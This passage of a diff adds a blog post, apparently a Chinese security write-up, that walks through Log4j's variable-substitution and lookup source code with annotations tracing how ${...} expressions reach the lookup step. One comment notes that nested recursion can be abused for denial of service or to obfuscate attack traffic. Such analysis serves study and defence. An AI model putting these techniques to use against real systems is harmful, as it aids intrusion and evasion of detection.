+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">StrMatcher</span> <span class="n">prefixMatcher</span> <span class="o">=</span> <span class="n">getVariablePrefixMatcher</span><span class="o">();</span> <span class="c1">//${
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">final</span> <span class="n">StrMatcher</span> <span class="n">suffixMatcher</span> <span class="o">=</span> <span class="n">getVariableSuffixMatcher</span><span class="o">();</span> <span class="c1">//}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">final</span> <span class="kt">char</span> <span class="n">escape</span> <span class="o">=</span> <span class="n">getEscapeChar</span><span class="o">();</span> <span class="c1">//$
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">final</span> <span class="n">StrMatcher</span> <span class="n">valueDelimiterMatcher</span> <span class="o">=</span> <span class="n">getValueDelimiterMatcher</span><span class="o">();</span> <span class="c1">//:-
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">substitutionInVariablesEnabled</span> <span class="o">=</span> <span class="n">isEnableSubstitutionInVariables</span><span class="o">();</span> <span class="c1">//启用变量替换,默认为true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">top</span> <span class="o">=</span> <span class="n">priorVariables</span> <span class="o">==</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">altered</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">lengthChange</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span><span class="o">[]</span> <span class="n">chars</span> <span class="o">=</span> <span class="n">getChars</span><span class="o">(</span><span class="n">buf</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">bufEnd</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">length</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">offset</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="o">(</span><span class="n">pos</span> <span class="o">&lt;</span> <span class="n">bufEnd</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="kt">int</span> <span class="n">startMatchLen</span> <span class="o">=</span> <span class="n">prefixMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">chars</span><span class="o">,</span> <span class="n">pos</span><span class="o">,</span> <span class="n">offset</span><span class="o">,</span> <span class="n">bufEnd</span><span class="o">);</span> <span class="c1">//对开头的${进行匹配
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">startMatchLen</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span><span class="o">++;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// found variable start marker
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">pos</span> <span class="o">&gt;</span> <span class="n">offset</span> <span class="o">&amp;&amp;</span> <span class="n">chars</span><span class="o">[</span><span class="n">pos</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span> <span class="o">==</span> <span class="n">escape</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// escaped
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">buf</span><span class="o">.</span><span class="na">deleteCharAt</span><span class="o">(</span><span class="n">pos</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">chars</span> <span class="o">=</span> <span class="n">getChars</span><span class="o">(</span><span class="n">buf</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">lengthChange</span><span class="o">--;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">altered</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">bufEnd</span><span class="o">--;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span><span class="c1">//查找后缀
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="c1">// find suffix
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="kd">final</span> <span class="kt">int</span> <span class="n">startPos</span> <span class="o">=</span> <span class="n">pos</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">pos</span> <span class="o">+=</span> <span class="n">startMatchLen</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="kt">int</span> <span class="n">endMatchLen</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="kt">int</span> <span class="n">nestedVarCount</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">while</span> <span class="o">(</span><span class="n">pos</span> <span class="o">&lt;</span> <span class="n">bufEnd</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="o">(</span><span class="n">substitutionInVariablesEnabled</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">endMatchLen</span> <span class="o">=</span> <span class="n">prefixMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">chars</span><span class="o">,</span> <span class="n">pos</span><span class="o">,</span> <span class="n">offset</span><span class="o">,</span> <span class="n">bufEnd</span><span class="o">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="c1">//通过while循环处理嵌套变量,即${${${}}}的情况,直到没有嵌套
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="c1">// found a nested variable start
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="n">nestedVarCount</span><span class="o">++;</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">pos</span> <span class="o">+=</span> <span class="n">endMatchLen</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">continue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="n">endMatchLen</span> <span class="o">=</span> <span class="n">suffixMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">chars</span><span class="o">,</span> <span class="n">pos</span><span class="o">,</span> <span class="n">offset</span><span class="o">,</span> <span class="n">bufEnd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="o">(</span><span class="n">endMatchLen</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">pos</span><span class="o">++;</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="c1">//找到匹配的后缀
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="c1">// found variable end marker
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="k">if</span> <span class="o">(</span><span class="n">nestedVarCount</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">String</span> <span class="n">varNameExpr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">chars</span><span class="o">,</span> <span class="n">startPos</span> <span class="o">+</span> <span class="n">startMatchLen</span><span class="o">,</span> <span class="n">pos</span> <span class="o">-</span> <span class="n">startPos</span> <span class="o">-</span> <span class="n">startMatchLen</span><span class="o">);</span> <span class="c1">//将${xx}中的内容提取出来
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="o">(</span><span class="n">substitutionInVariablesEnabled</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="kd">final</span> <span class="n">StringBuilder</span> <span class="n">bufName</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">varNameExpr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">substitute</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">bufName</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">bufName</span><span class="o">.</span><span class="na">length</span><span class="o">());</span><span class="c1">//递归处理,后续可以利用这一点进行dos攻击或攻击流量混淆
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                    <span class="n">varNameExpr</span> <span class="o">=</span> <span class="n">bufName</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">pos</span> <span class="o">+=</span> <span class="n">endMatchLen</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                <span class="kd">final</span> <span class="kt">int</span> <span class="n">endPos</span> <span class="o">=</span> <span class="n">pos</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="n">String</span> <span class="n">varName</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">String</span> <span class="n">varDefaultValue</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="o">(</span><span class="n">valueDelimiterMatcher</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="kd">final</span> <span class="kt">char</span> <span class="o">[]</span> <span class="n">varNameExprChars</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                                    <span class="kt">int</span> <span class="n">valueDelimiterMatchLen</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">varNameExprChars</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                        <span class="c1">// if there&#39;s any nested variable when nested variable substitution disabled, then stop resolving name and default value.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                        <span class="k">if</span> <span class="o">(!</span><span class="n">substitutionInVariablesEnabled</span>
+</span></span><span class="line"><span class="cl">                                                <span class="o">&amp;&amp;</span> <span class="n">prefixMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">varNameExprChars</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">varNameExprChars</span><span class="o">.</span><span class="na">length</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                            <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                        <span class="k">if</span> <span class="o">(</span><span class="n">valueEscapeDelimiterMatcher</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                            <span class="kt">int</span> <span class="n">matchLen</span> <span class="o">=</span> <span class="n">valueEscapeDelimiterMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">varNameExprChars</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                            <span class="k">if</span> <span class="o">(</span><span class="n">matchLen</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="c1">//根据valueEscapeDelimiterMatcher:\-进行分割处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="n">String</span> <span class="n">varNamePrefix</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="n">Interpolator</span><span class="o">.</span><span class="na">PREFIX_SEPARATOR</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                                <span class="n">varName</span> <span class="o">=</span> <span class="n">varNamePrefix</span> <span class="o">+</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">matchLen</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">matchLen</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">varNameExprChars</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">j</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">                                                    <span class="k">if</span> <span class="o">((</span><span class="n">valueDelimiterMatchLen</span> <span class="o">=</span> <span class="n">valueDelimiterMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">varNameExprChars</span><span class="o">,</span> <span class="n">j</span><span class="o">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="n">varName</span> <span class="o">=</span> <span class="n">varNamePrefix</span> <span class="o">+</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">matchLen</span><span class="o">,</span> <span class="n">j</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="n">varDefaultValue</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">valueDelimiterMatchLen</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="c1">//根据valueDelimiterMatcher即:-进行分割处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                                <span class="k">if</span> <span class="o">((</span><span class="n">valueDelimiterMatchLen</span> <span class="o">=</span> <span class="n">valueDelimiterMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">varNameExprChars</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                                    <span class="n">varName</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                    <span class="n">varDefaultValue</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">valueDelimiterMatchLen</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                    <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                            <span class="k">if</span> <span class="o">((</span><span class="n">valueDelimiterMatchLen</span> <span class="o">=</span> <span class="n">valueDelimiterMatcher</span><span class="o">.</span><span class="na">isMatch</span><span class="o">(</span><span class="n">varNameExprChars</span><span class="o">,</span> <span class="n">i</span><span class="o">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                                <span class="n">varName</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                <span class="n">varDefaultValue</span> <span class="o">=</span> <span class="n">varNameExpr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">valueDelimiterMatchLen</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">// on the first call initialize priorVariables
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="o">(</span><span class="n">priorVariables</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">priorVariables</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">priorVariables</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">chars</span><span class="o">,</span> <span class="n">offset</span><span class="o">,</span> <span class="n">length</span> <span class="o">+</span> <span class="n">lengthChange</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">// handle cyclic substitution
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="n">checkCyclicSubstitution</span><span class="o">(</span><span class="n">varName</span><span class="o">,</span> <span class="n">priorVariables</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">priorVariables</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">varName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">// resolve the variable
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="n">String</span> <span class="n">varValue</span> <span class="o">=</span> <span class="n">resolveVariable</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">varName</span><span class="o">,</span> <span class="n">buf</span><span class="o">,</span> <span class="n">startPos</span><span class="o">,</span> <span class="n">endPos</span><span class="o">);</span> <span class="c1">//对解析出的varValue进行resolve处理,后续进入lookup流程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="o">(</span><span class="n">varValue</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">varValue</span> <span class="o">=</span> <span class="n">varDefaultValue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">if</span> <span class="o">(</span><span class="n">varValue</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                                    <span class="c1">// recursive replace
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                    <span class="kd">final</span> <span class="kt">int</span> <span class="n">varLen</span> <span class="o">=</span> <span class="n">varValue</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">buf</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="n">startPos</span><span class="o">,</span> <span class="n">endPos</span><span class="o">,</span> <span class="n">varValue</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">altered</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                    <span class="kt">int</span> <span class="n">change</span> <span class="o">=</span> <span class="n">substitute</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">buf</span><span class="o">,</span> <span class="n">startPos</span><span class="o">,</span> <span class="n">varLen</span><span class="o">,</span> <span class="n">priorVariables</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">change</span> <span class="o">=</span> <span class="n">change</span> <span class="o">+</span> <span class="o">(</span><span class="n">varLen</span> <span class="o">-</span> <span class="o">(</span><span class="n">endPos</span> <span class="o">-</span> <span class="n">startPos</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">pos</span> <span class="o">+=</span> <span class="n">change</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">bufEnd</span> <span class="o">+=</span> <span class="n">change</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">lengthChange</span> <span class="o">+=</span> <span class="n">change</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">chars</span> <span class="o">=</span> <span class="n">getChars</span><span class="o">(</span><span class="n">buf</span><span class="o">);</span> <span class="c1">// in case buffer was altered
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                <span class="c1">// remove variable from the cyclic stack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="n">priorVariables</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">priorVariables</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">nestedVarCount</span><span class="o">--;</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">pos</span> <span class="o">+=</span> <span class="n">endMatchLen</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">top</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">altered</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">lengthChange</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="lookup处理">lookup处理</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/3aea3a8369d2ada5dc8ebe2bed9f1e77.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/3aea3a8369d2ada5dc8ebe2bed9f1e77.png, https://img.mi3aka.eu.org/2023/02/3aea3a8369d2ada5dc8ebe2bed9f1e77.png 1.5x, https://img.mi3aka.eu.org/2023/02/3aea3a8369d2ada5dc8ebe2bed9f1e77.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/3aea3a8369d2ada5dc8ebe2bed9f1e77.png"
+        title="https://img.mi3aka.eu.org/2023/02/3aea3a8369d2ada5dc8ebe2bed9f1e77.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.core.lookup.Interpolator
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">String</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="n">String</span> <span class="n">var</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">var</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">prefixPos</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">PREFIX_SEPARATOR</span><span class="o">);</span><span class="c1">//PREFIX_SEPARATOR为冒号,这里对prefix:key进行分割操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">prefixPos</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">prefix</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">prefixPos</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">US</span><span class="o">);</span><span class="c1">//提取prefix
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kd">final</span> <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">prefixPos</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span><span class="c1">//提取name
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kd">final</span> <span class="n">StrLookup</span> <span class="n">lookup</span> <span class="o">=</span> <span class="n">strLookupMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">prefix</span><span class="o">);</span><span class="c1">//根据prefix获取lookup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">lookup</span> <span class="k">instanceof</span> <span class="n">ConfigurationAware</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">((</span><span class="n">ConfigurationAware</span><span class="o">)</span> <span class="n">lookup</span><span class="o">).</span><span class="na">setConfiguration</span><span class="o">(</span><span class="n">configuration</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">lookup</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">value</span> <span class="o">=</span> <span class="n">event</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">lookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">:</span> <span class="n">lookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span><span class="c1">//进行lookup操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
